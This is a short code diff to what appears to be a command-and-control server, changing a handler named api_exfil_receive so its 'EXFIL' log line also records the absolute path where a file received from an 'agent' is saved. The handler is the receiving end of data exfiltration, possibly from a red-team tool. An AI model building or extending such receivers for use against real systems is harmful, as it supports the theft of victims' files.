@@ -958,7 +958,8 @@ async def api_exfil_receive(request: web.Request) -> web.Response:
     with open(dest_path, "wb") as f:
         f.write(data)
 
-    log.info("EXFIL agent_id=%.8s file=%s size=%d", agent_id, filename, len(data))
+    abs_path = os.path.abspath(dest_path)
+    log.info("EXFIL agent_id=%.8s file=%s size=%d → %s", agent_id, filename, len(data), abs_path)
     return web.json_response({"status": "ok", "saved": dest_path, "size": len(data)})
 
 
